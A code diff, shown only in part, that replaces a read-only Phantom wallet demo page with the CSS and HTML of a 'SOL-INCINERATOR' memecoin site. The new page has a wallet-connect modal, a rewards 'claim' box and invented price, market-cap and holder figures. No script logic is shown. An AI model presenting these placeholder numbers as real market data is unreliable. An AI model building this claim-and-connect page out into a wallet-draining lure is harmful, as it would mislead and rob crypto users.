@@ -1,252 +1,1947 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Phantom Wallet – Sichere Demo (nur lesend)</title>
-<style>
-:root {
-  --bg: #0d0f1a;
-  --card: #161a2e;
-  --text: #e8eaf6;
-  --muted: #9aa0b5;
-  --accent: #9945ff; /* Phantom Purple */
-  --ok: #2ecc71;
-  --err: #ff5f56;
-  --border: #2a2f4a;
-}
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body {
-  font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
-  background: var(--bg);
-  color: var(--text);
-  min-height: 100vh;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  padding: 20px;
-}
-.card {
-  background: var(--card);
-  border: 1px solid var(--border);
-  border-radius: 16px;
-  padding: 32px;
-  width: 100%;
-  max-width: 480px;
-  box-shadow: 0 20px 60px rgba(0,0,0,.4);
-}
-h1 { font-size: 1.35rem; margin-bottom: 6px; }
-.subtitle { color: var(--muted); font-size: .9rem; margin-bottom: 24px; }
-.btn {
-  width: 100%;
-  padding: 14px 18px;
-  border: none;
-  border-radius: 10px;
-  font-size: 1rem;
-  font-weight: 600;
-  cursor: pointer;
-  transition: transform .1s, opacity .2s;
-  background: var(--accent);
-  color: #fff;
-}
-.btn:hover { opacity: .9; }
-.btn:active { transform: scale(.98); }
-.btn:disabled { opacity: .5; cursor: not-allowed; }
-.btn.secondary { background: #2a2f4a; color: var(--text); }
-.info { margin-top: 20px; }
-.row {
-  display: flex;
-  justify-content: space-between;
-  gap: 12px;
-  padding: 10px 0;
-  border-bottom: 1px solid var(--border);
-  font-size: .92rem;
-}
-.row .label { color: var(--muted); flex-shrink: 0; }
-.row .value {
-  word-break: break-all;
-  text-align: right;
-  font-family: ui-monospace, "Cascadia Mono", Consolas, monospace;
-}
-.badge {
-  display: inline-block;
-  padding: 3px 10px;
-  border-radius: 999px;
-  font-size: .8rem;
-  font-weight: 600;
-}
-.badge.ok { background: rgba(46,204,113,.15); color: var(--ok); }
-.badge.err { background: rgba(255,95,86,.15); color: var(--err); }
-.msg { margin-top: 16px; font-size: .88rem; color: var(--muted); min-height: 1.2em; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOL-INCINERATOR</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bignumber.js/9.1.2/bignumber.min.js"></script>
+    <style>
+        /* ===== RESET & BASE ===== */
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        html { scroll-behavior: smooth; }
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            min-height: 100vh;
+            overflow-x: hidden;
+            line-height: 1.6;
+        }
+        a { color: #00ff41; text-decoration: none; }
+        a:hover { text-shadow: 0 0 8px #00ff41; }
+
+        /* ===== PIXEL HEADINGS ===== */
+        h1, h2, h3, .pixel-font, .logo-text, .nav-link, .btn-wallet, .modal-title {
+            font-family: 'Press Start 2P', monospace;
+            letter-spacing: 1px;
+        }
+
+        /* ===== NAVIGATION ===== */
+        .navbar {
+            position: fixed; top: 0; left: 0; right: 0;
+            z-index: 1000;
+            background: rgba(10, 10, 10, 0.95);
+            border-bottom: 1px solid #00ff41;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 0 24px;
+            height: 64px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .nav-left { display: flex; align-items: center; gap: 12px; }
+        .nav-logo-icon {
+            width: 36px; height: 36px;
+            background: #00ff41;
+            clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+            animation: pulseGlow 2s ease-in-out infinite;
+            flex-shrink: 0;
+        }
+        @keyframes pulseGlow {
+            0%, 100% { box-shadow: 0 0 8px #00ff41; }
+            50% { box-shadow: 0 0 20px #00ff41, 0 0 40px #00ff4133; }
+        }
+        .logo-text {
+            font-size: 14px;
+            color: #00ff41;
+            text-shadow: 0 0 10px #00ff41;
+            white-space: nowrap;
+        }
+        .nav-center { display: flex; align-items: center; gap: 4px; }
+        .nav-link {
+            font-size: 11px;
+            color: #a0a0a0;
+            padding: 8px 16px;
+            border: 1px solid transparent;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            background: transparent;
+            font-family: 'Press Start 2P', monospace;
+        }
+        .nav-link:hover, .nav-link.active {
+            color: #00ff41;
+            border-color: #00ff41;
+            text-shadow: 0 0 8px #00ff41;
+            box-shadow: inset 0 0 20px rgba(0,255,65,0.05);
+        }
+        .nav-right { display: flex; align-items: center; gap: 12px; }
+
+        .btn-wallet {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 10px;
+            padding: 10px 18px;
+            border: 1px solid #00ff41;
+            background: transparent;
+            color: #00ff41;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-shadow: 0 0 5px #00ff41;
+            white-space: nowrap;
+        }
+        .btn-wallet:hover {
+            background: rgba(0,255,65,0.1);
+            box-shadow: 0 0 20px rgba(0,255,65,0.3);
+        }
+        .btn-wallet.connected {
+            border-color: #00ff41;
+            background: rgba(0,255,65,0.05);
+        }
+        .btn-wallet.connected .wallet-disconnect {
+            color: #ff4444;
+            border-color: #ff4444;
+        }
+        .btn-wallet .wallet-disconnect {
+            font-size: 10px;
+            padding: 2px 8px;
+            border: 1px solid #ff4444;
+            color: #ff4444;
+            background: transparent;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-left: 8px;
+        }
+        .btn-wallet .wallet-disconnect:hover {
+            background: rgba(255,68,68,0.15);
+            box-shadow: 0 0 12px rgba(255,68,68,0.3);
+        }
+
+        .hamburger {
+            display: none;
+            flex-direction: column;
+            gap: 5px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+        }
+        .hamburger span {
+            width: 24px; height: 2px;
+            background: #00ff41;
+            transition: all 0.3s;
+            box-shadow: 0 0 6px #00ff41;
+        }
+        .hamburger.active span:nth-child(1) { transform: rotate(45deg) translate(5px, 5px); }
+        .hamburger.active span:nth-child(2) { opacity: 0; }
+        .hamburger.active span:nth-child(3) { transform: rotate(-45deg) translate(5px, -5px); }
+
+        /* Mobile nav drawer */
+        .mobile-nav {
+            display: none;
+            position: fixed;
+            top: 64px; left: 0; right: 0;
+            background: rgba(10,10,10,0.98);
+            border-bottom: 1px solid #00ff41;
+            padding: 16px;
+            flex-direction: column;
+            gap: 8px;
+            z-index: 999;
+        }
+        .mobile-nav.open { display: flex; }
+        .mobile-nav .nav-link {
+            font-size: 10px;
+            padding: 12px 16px;
+            width: 100%;
+            text-align: left;
+        }
+
+        /* ===== HERO ===== */
+        .hero {
+            padding: 120px 24px 80px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: radial-gradient(circle at center, rgba(0,255,65,0.03) 0%, transparent 60%);
+            animation: heroGlow 6s ease-in-out infinite;
+            pointer-events: none;
+        }
+        @keyframes heroGlow {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.2); opacity: 1; }
+        }
+        .hero-content { position: relative; z-index: 1; }
+        .hero-badge {
+            display: inline-block;
+            font-size: 10px;
+            font-family: 'Press Start 2P', monospace;
+            color: #00ff41;
+            border: 1px solid #00ff41;
+            padding: 6px 16px;
+            margin-bottom: 24px;
+            animation: flicker 3s infinite;
+        }
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            92% { opacity: 1; }
+            93% { opacity: 0.3; }
+            94% { opacity: 1; }
+            96% { opacity: 0.2; }
+            97% { opacity: 1; }
+        }
+        .hero-title {
+            font-family: 'Press Start 2P', monospace;
+            font-size: clamp(28px, 6vw, 64px);
+            color: #00ff41;
+            text-shadow: 0 0 20px #00ff41, 0 0 40px rgba(0,255,65,0.3);
+            margin-bottom: 16px;
+            line-height: 1.2;
+        }
+        .hero-sub {
+            font-size: clamp(14px, 2vw, 20px);
+            color: #888;
+            margin-bottom: 32px;
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .hero-stats {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 32px;
+        }
+        .hero-stat {
+            border: 1px solid #00ff4144;
+            padding: 12px 20px;
+            min-width: 140px;
+            background: rgba(0,255,65,0.02);
+        }
+        .hero-stat-label {
+            font-size: 9px;
+            font-family: 'Press Start 2P', monospace;
+            color: #666;
+            margin-bottom: 6px;
+        }
+        .hero-stat-value {
+            font-size: 18px;
+            color: #00ff41;
+            font-weight: 700;
+            text-shadow: 0 0 8px rgba(0,255,65,0.3);
+        }
+        .hero-cta {
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        .btn-primary {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 12px;
+            padding: 14px 32px;
+            border: 1px solid #00ff41;
+            background: transparent;
+            color: #00ff41;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-shadow: 0 0 8px #00ff41;
+        }
+        .btn-primary:hover {
+            background: rgba(0,255,65,0.1);
+            box-shadow: 0 0 30px rgba(0,255,65,0.3), inset 0 0 30px rgba(0,255,65,0.05);
+        }
+        .btn-secondary {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 12px;
+            padding: 14px 32px;
+            border: 1px solid #444;
+            background: transparent;
+            color: #888;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-secondary:hover {
+            border-color: #00ff41;
+            color: #00ff41;
+        }
+
+        /* ===== SECTION COMMON ===== */
+        .section {
+            padding: 60px 24px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .section-title {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 18px;
+            color: #00ff41;
+            text-shadow: 0 0 10px #00ff41;
+            margin-bottom: 32px;
+            text-align: center;
+        }
+        .section-title span {
+            border-bottom: 2px solid #00ff41;
+            padding-bottom: 8px;
+        }
+
+        /* ===== DASHBOARD GRID ===== */
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 16px;
+            margin-bottom: 40px;
+        }
+        .dash-card {
+            border: 1px solid #00ff4133;
+            padding: 20px;
+            background: rgba(0,255,65,0.02);
+            transition: all 0.3s;
+        }
+        .dash-card:hover {
+            border-color: #00ff41;
+            box-shadow: 0 0 20px rgba(0,255,65,0.08);
+        }
+        .dash-card-label {
+            font-size: 9px;
+            font-family: 'Press Start 2P', monospace;
+            color: #666;
+            margin-bottom: 8px;
+        }
+        .dash-card-value {
+            font-size: 22px;
+            font-weight: 700;
+            color: #fff;
+        }
+        .dash-card-value.green { color: #00ff41; }
+        .dash-card-value.red { color: #ff4444; }
+        .dash-card-value.small { font-size: 16px; }
+        .dash-card-change {
+            font-size: 12px;
+            margin-top: 4px;
+        }
+        .dash-card-change.up { color: #00ff41; }
+        .dash-card-change.down { color: #ff4444; }
+
+        /* ===== TRADING PANEL ===== */
+        .trading-panel {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 40px;
+        }
+        .trade-card {
+            border: 1px solid #00ff4133;
+            padding: 24px;
+            background: rgba(0,255,65,0.02);
+        }
+        .trade-card h3 {
+            font-size: 12px;
+            color: #00ff41;
+            margin-bottom: 16px;
+            font-family: 'Press Start 2P', monospace;
+        }
+        .trade-input-group {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+        .trade-input {
+            flex: 1;
+            background: #111;
+            border: 1px solid #333;
+            padding: 12px 16px;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            outline: none;
+            transition: border 0.3s;
+        }
+        .trade-input:focus {
+            border-color: #00ff41;
+            box-shadow: 0 0 10px rgba(0,255,65,0.15);
+        }
+        .trade-input::placeholder { color: #444; }
+        .trade-select {
+            background: #111;
+            border: 1px solid #333;
+            padding: 12px;
+            color: #00ff41;
+            font-family: 'Press Start 2P', monospace;
+            font-size: 10px;
+            cursor: pointer;
+            min-width: 80px;
+        }
+        .trade-btn {
+            width: 100%;
+            padding: 14px;
+            font-family: 'Press Start 2P', monospace;
+            font-size: 11px;
+            border: 1px solid;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-shadow: 0 0 5px;
+        }
+        .trade-btn.buy {
+            border-color: #00ff41;
+            color: #00ff41;
+            background: transparent;
+        }
+        .trade-btn.buy:hover {
+            background: rgba(0,255,65,0.1);
+            box-shadow: 0 0 20px rgba(0,255,65,0.2);
+        }
+        .trade-btn.sell {
+            border-color: #ff4444;
+            color: #ff4444;
+            background: transparent;
+        }
+        .trade-btn.sell:hover {
+            background: rgba(255,68,68,0.1);
+            box-shadow: 0 0 20px rgba(255,68,68,0.2);
+        }
+
+        /* ===== CHART PLACEHOLDER ===== */
+        .chart-container {
+            border: 1px solid #00ff4133;
+            padding: 24px;
+            margin-bottom: 40px;
+            background: rgba(0,255,65,0.02);
+            position: relative;
+            overflow: hidden;
+        }
+        .chart-container h3 {
+            font-size: 12px;
+            color: #00ff41;
+            margin-bottom: 16px;
+            font-family: 'Press Start 2P', monospace;
+        }
+        .chart-canvas {
+            width: 100%;
+            height: 300px;
+            background: #0a0a0a;
+            position: relative;
+            overflow: hidden;
+        }
+        .chart-canvas canvas {
+            width: 100%;
+            height: 100%;
+        }
+
+        /* ===== TRANSACTIONS ===== */
+        .tx-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 40px;
+        }
+        .tx-table th {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 10px;
+            color: #666;
+            padding: 12px 16px;
+            border-bottom: 1px solid #00ff4133;
+            text-align: left;
+        }
+        .tx-table td {
+            padding: 12px 16px;
+            border-bottom: 1px solid #111;
+            font-size: 12px;
+            color: #aaa;
+        }
+        .tx-table tr:hover td {
+            background: rgba(0,255,65,0.02);
+        }
+        .tx-type { font-weight: 600; }
+        .tx-type.buy { color: #00ff41; }
+        .tx-type.sell { color: #ff4444; }
+        .tx-address { color: #00ff41; font-size: 11px; }
+        .tx-time { color: #555; font-size: 11px; }
+
+        /* ===== TRENDING ===== */
+        .trending-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+            margin-bottom: 40px;
+        }
+        .trending-item {
+            border: 1px solid #00ff4133;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        .trending-item:hover {
+            border-color: #00ff41;
+            box-shadow: 0 0 15px rgba(0,255,65,0.1);
+        }
+        .trending-icon {
+            width: 32px; height: 32px;
+            border: 1px solid #00ff41;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+        .trending-info { flex: 1; min-width: 0; }
+        .trending-name {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 9px;
+            color: #fff;
+            margin-bottom: 2px;
+        }
+        .trending-ticker {
+            font-size: 10px;
+            color: #00ff41;
+        }
+        .trending-price {
+            font-size: 13px;
+            font-weight: 600;
+            color: #fff;
+        }
+        .trending-change {
+            font-size: 11px;
+        }
+        .trending-change.up { color: #00ff41; }
+        .trending-change.down { color: #ff4444; }
+
+        /* ===== WALLET MODAL - UPDATED ===== */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(4px);
+        }
+        .modal-overlay.open { display: flex; }
+        .modal {
+            background: #0d0d0d;
+            border: 1px solid #00ff41;
+            padding: 32px;
+            width: 90%;
+            max-width: 480px;
+            position: relative;
+            box-shadow: 0 0 40px rgba(0,255,65,0.1), 0 0 80px rgba(0,255,65,0.05);
+            animation: modalIn 0.3s ease;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        @keyframes modalIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .modal-close {
+            position: absolute;
+            top: 16px; right: 16px;
+            background: none;
+            border: 1px solid #444;
+            color: #666;
+            font-size: 16px;
+            width: 32px; height: 32px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Press Start 2P', monospace;
+            transition: all 0.3s;
+        }
+        .modal-close:hover {
+            border-color: #ff4444;
+            color: #ff4444;
+        }
+        .modal-title {
+            font-size: 16px;
+            color: #00ff41;
+            text-shadow: 0 0 8px #00ff41;
+            margin-bottom: 8px;
+        }
+        .modal-subtitle {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 24px;
+        }
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 16px;
+            border: 1px solid #222;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: transparent;
+            width: 100%;
+            text-align: left;
+            color: #e0e0e0;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .wallet-option:hover {
+            border-color: #00ff41;
+            box-shadow: 0 0 15px rgba(0,255,65,0.1);
+            background: rgba(0,255,65,0.03);
+        }
+        .wallet-option.disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .wallet-option.disabled:hover {
+            border-color: #333;
+            box-shadow: none;
+            background: transparent;
+        }
+        .wallet-option-icon {
+            width: 40px; height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            border: 1px solid #333;
+            flex-shrink: 0;
+        }
+        .wallet-option-info { flex: 1; min-width: 0; }
+        .wallet-option-name {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 11px;
+            color: #fff;
+            margin-bottom: 2px;
+        }
+        .wallet-option-desc {
+            font-size: 11px;
+            color: #666;
+        }
+        .wallet-option-status {
+            font-size: 9px;
+            font-family: 'Press Start 2P', monospace;
+            padding: 4px 10px;
+            border: 1px solid;
+            white-space: nowrap;
+        }
+        .wallet-option-status.available {
+            color: #00ff41;
+            border-color: #00ff41;
+        }
+        .wallet-option-status.install {
+            color: #ffaa00;
+            border-color: #ffaa00;
+        }
+        .wallet-option-status.error {
+            color: #ff4444;
+            border-color: #ff4444;
+        }
+
+        /* Connected accounts inside modal */
+        .modal-accounts {
+            margin-top: 16px;
+            border-top: 1px solid #00ff4133;
+            padding-top: 16px;
+        }
+        .modal-accounts-title {
+            font-size: 9px;
+            font-family: 'Press Start 2P', monospace;
+            color: #666;
+            margin-bottom: 12px;
+        }
+        .modal-account-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 12px;
+            border: 1px solid #222;
+            margin-bottom: 6px;
+            background: rgba(0,255,65,0.02);
+        }
+        .modal-account-row .acc-name {
+            font-size: 10px;
+            color: #00ff41;
+            font-family: 'Press Start 2P', monospace;
+        }
+        .modal-account-row .acc-addr {
+            font-size: 11px;
+            color: #888;
+            word-break: break-all;
+            flex: 1;
+        }
+        .modal-account-row .acc-remove {
+            border: 1px solid #ff4444;
+            background: transparent;
+            color: #ff4444;
+            cursor: pointer;
+            padding: 4px 10px;
+            font-size: 9px;
+            font-family: 'Press Start 2P', monospace;
+            transition: all 0.3s;
+        }
+        .modal-account-row .acc-remove:hover {
+            background: rgba(255,68,68,0.1);
+        }
+
+        .modal-actions {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-top: 16px;
+        }
+        .modal-btn {
+            width: 100%;
+            padding: 14px;
+            font-family: 'Press Start 2P', monospace;
+            font-size: 11px;
+            border: 1px solid;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+        .modal-btn.primary {
+            border-color: #00ff41;
+            color: #00ff41;
+            background: transparent;
+        }
+        .modal-btn.primary:hover {
+            background: rgba(0,255,65,0.1);
+            box-shadow: 0 0 20px rgba(0,255,65,0.2);
+        }
+        .modal-btn.secondary {
+            border-color: #444;
+            color: #888;
+            background: transparent;
+        }
+        .modal-btn.secondary:hover {
+            border-color: #00ff41;
+            color: #00ff41;
+        }
+        .modal-btn.danger {
+            border-color: #ff4444;
+            color: #ff4444;
+            background: transparent;
+        }
+        .modal-btn.danger:hover {
+            background: rgba(255,68,68,0.1);
+        }
+
+        .modal-status {
+            display: none;
+            margin-top: 12px;
+            padding: 10px;
+            border: 1px solid #444;
+            font-size: 10px;
+            color: #aaa;
+            word-break: break-word;
+        }
+        .modal-status.open { display: block; }
+        .modal-status.error { border-color: #ff4444; color: #ff4444; }
+        .modal-status.success { border-color: #00ff41; color: #00ff41; }
+
+        .modal-warning {
+            margin-top: 16px;
+            text-align: center;
+            font-size: 9px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .modal-footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 11px;
+            color: #555;
+        }
+        .modal-footer a {
+            color: #00ff41;
+            text-decoration: underline;
+        }
+
+        /* ===== CLAIM PAGE IN MODAL ===== */
+        .claim-box {
+            margin-top: 16px;
+            border: 1px solid #00ff4133;
+            padding: 24px;
+            text-align: center;
+            background: rgba(0,255,65,0.02);
+        }
+        .claim-label {
+            font-size: 9px;
+            font-family: 'Press Start 2P', monospace;
+            color: #666;
+            letter-spacing: 4px;
+        }
+        .claim-amount {
+            font-size: 36px;
+            color: #00ff41;
+            font-weight: 700;
+            margin: 12px 0;
+            text-shadow: 0 0 10px rgba(0,255,65,0.3);
+        }
+        .claim-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+        .claim-text {
+            font-size: 11px;
+            color: #666;
+            line-height: 1.6;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            border-top: 1px solid #00ff4133;
+            padding: 32px 24px;
+            text-align: center;
+            color: #444;
+            font-size: 10px;
+        }
+        .footer a { color: #00ff41; }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .navbar { padding: 0 16px; }
+            .nav-center { display: none; }
+            .hamburger { display: flex; }
+            .btn-wallet { font-size: 8px; padding: 8px 12px; }
+            .logo-text { font-size: 11px; }
+            .hero { padding: 100px 16px 60px; }
+            .hero-title { font-size: 22px; }
+            .hero-stats { gap: 8px; }
+            .hero-stat { padding: 10px 14px; min-width: 100px; }
+            .hero-stat-value { font-size: 14px; }
+            .section { padding: 40px 16px; }
+            .section-title { font-size: 14px; }
+            .dashboard-grid { grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 8px; }
+            .dash-card { padding: 14px; }
+            .dash-card-value { font-size: 16px; }
+            .trading-panel { grid-template-columns: 1fr; }
+            .modal { padding: 20px; }
+            .wallet-option { padding: 12px; gap: 12px; }
+            .wallet-option-name { font-size: 9px; }
+            .tx-table th, .tx-table td { padding: 8px 10px; font-size: 10px; }
+            .trending-grid { grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); }
+            .nav-link { font-size: 9px; padding: 6px 12px; }
+        }
+        @media (max-width: 480px) {
+            .hero-title { font-size: 18px; }
+            .hero-stat { min-width: 80px; padding: 8px 10px; }
+            .hero-stat-value { font-size: 12px; }
+            .hero-stat-label { font-size: 7px; }
+            .btn-primary, .btn-secondary { font-size: 10px; padding: 10px 20px; }
+            .modal { padding: 16px; }
+            .wallet-option { padding: 10px; gap: 8px; }
+            .wallet-option-icon { width: 32px; height: 32px; font-size: 18px; }
+        }
+
+        /* ===== SCROLLBAR ===== */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0a0a0a; }
+        ::-webkit-scrollbar-thumb { background: #00ff4133; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #00ff4166; }
+
+        /* ===== LOADING SPINNER ===== */
+        .spinner {
+            display: inline-block;
+            width: 14px; height: 14px;
+            border: 2px solid #00ff41;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 6px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ===== TOAST ===== */
+        .toast-container {
+            position: fixed;
+            bottom: 24px; right: 24px;
+            z-index: 3000;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .toast {
+            border: 1px solid;
+            padding: 12px 20px;
+            font-size: 11px;
+            font-family: 'Press Start 2P', monospace;
+            animation: toastIn 0.3s ease;
+            max-width: 360px;
+        }
+        .toast.success { border-color: #00ff41; color: #00ff41; background: rgba(0,255,65,0.05); }
+        .toast.error { border-color: #ff4444; color: #ff4444; background: rgba(255,68,68,0.05); }
+        .toast.info { border-color: #4a9eff; color: #4a9eff; background: rgba(74,158,255,0.05); }
+        @keyframes toastIn {
+            from { transform: translateX(100px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+    </style>
 </head>
 <body>
-  <main class="card">
-    <h1>Phantom Wallet – Demo</h1>
-    <p class="subtitle">Nur lesender Zugriff: Verbinden, öffentliche Adresse anzeigen, Testnachricht signieren. Keine Transaktionen, keine Approvals.</p>
 
-    <button id="btnConnect" class="btn">Connect Phantom</button>
-    <button id="btnSign" class="btn secondary" style="margin-top:10px" disabled>"This is only a test signature." signieren</button>
-    <button id="btnDisconnect" class="btn secondary" style="margin-top:10px; display:none">Trennen</button>
+<!-- ===== NAVIGATION ===== -->
+<nav class="navbar">
+    <div class="nav-left">
+        <div class="nav-logo-icon"></div>
+        <span class="logo-text">SOL-INCINERATOR</span>
+    </div>
+    <div class="nav-center">
+        <button class="nav-link active" data-section="dashboard">INCINERATOR</button>
+        <button class="nav-link" data-section="tools">TOOLS</button>
+        <button class="nav-link" data-section="rewards">REWARDS</button>
+    </div>
+    <div class="nav-right">
+        <button class="btn-wallet" id="walletButton" onclick="openWalletModal()">
+            CONNECT WALLET
+        </button>
+        <button class="hamburger" id="hamburger" onclick="toggleMobileMenu()">
+            <span></span><span></span><span></span>
+        </button>
+    </div>
+</nav>
 
-    <section class="info" id="info" hidden>
-      <div class="row"><span class="label">Adresse</span><span class="value" id="address">–</span></div>
-      <div class="row"><span class="label">Signiert am</span><span class="value" id="time">–</span></div>
-      <div class="row"><span class="label">Status</span><span class="value" id="status"><span class="badge err">noch nicht signiert</span></span></div>
-    </section>
+<!-- ===== MOBILE NAV ===== -->
+<div class="mobile-nav" id="mobileNav">
+    <button class="nav-link active" data-section="dashboard" onclick="closeMobileMenu(); scrollToSection('dashboard')">INCINERATOR</button>
+    <button class="nav-link" data-section="tools" onclick="closeMobileMenu(); scrollToSection('tools')">TOOLS</button>
+    <button class="nav-link" data-section="rewards" onclick="closeMobileMenu(); scrollToSection('rewards')">REWARDS</button>
+</div>
 
-    <p class="msg" id="msg"></p>
-  </main>
+<!-- ===== HERO ===== -->
+<section class="hero">
+    <div class="hero-content">
+        <div class="hero-badge">&#9889; SOL INCINERATOR v2.0</div>
+        <h1 class="hero-title">SOL-INCINERATOR</h1>
+        <p class="hero-sub">The most degenerate memecoin on Solana. Burn SOL, earn incinerated rewards. No utility. Pure vibes.</p>
+        <div class="hero-stats">
+            <div class="hero-stat">
+                <div class="hero-stat-label">PRICE</div>
+                <div class="hero-stat-value">$0.000042</div>
+            </div>
+            <div class="hero-stat">
+                <div class="hero-stat-label">MARKET CAP</div>
+                <div class="hero-stat-value">$4,200,069</div>
+            </div>
+            <div class="hero-stat">
+                <div class="hero-stat-label">24H VOLUME</div>
+                <div class="hero-stat-value">$694,200</div>
+            </div>
+            <div class="hero-stat">
+                <div class="hero-stat-label">HOLDERS</div>
+                <div class="hero-stat-value">13,337</div>
+            </div>
+        </div>
+        <div class="hero-cta">
+            <button class="btn-primary" onclick="scrollToSection('trade')">&#9654; BUY $INCINERATE</button>
+            <button class="btn-secondary" onclick="scrollToSection('chart')">&#9664; CHART</button>
+        </div>
+    </div>
+</section>
 
+<!-- ===== DASHBOARD SECTION ===== -->
+<section class="section" id="dashboard">
+    <h2 class="section-title"><span>// DASHBOARD</span></h2>
+    <div class="dashboard-grid">
+        <div class="dash-card">
+            <div class="dash-card-label">SOL BALANCE</div>
+            <div class="dash-card-value green" id="solBalance">42.69</div>
+            <div class="dash-card-change up">&#9650; +2.4%</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">WALLET</div>
+            <div class="dash-card-value small" id="walletDisplay" style="font-size:12px; word-break:break-all;">Not Connected</div>
+            <div class="dash-card-change" id="walletStatus" style="color:#555;font-size:10px;">Connect wallet to view</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">$INCINERATE BALANCE</div>
+            <div class="dash-card-value green" id="tokenBalance">1,337,000</div>
+            <div class="dash-card-change up">&#9650; +69.4%</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">PORTFOLIO VALUE</div>
+            <div class="dash-card-value green" id="portfolioValue">$56.18</div>
+            <div class="dash-card-change up">&#9650; +4.2%</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">MARKET CAP</div>
+            <div class="dash-card-value">$4,200,069</div>
+            <div class="dash-card-change up">&#9650; +12.8%</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">24H VOLUME</div>
+            <div class="dash-card-value">$694,200</div>
+            <div class="dash-card-change up">&#9650; +88.7%</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">LIQUIDITY</div>
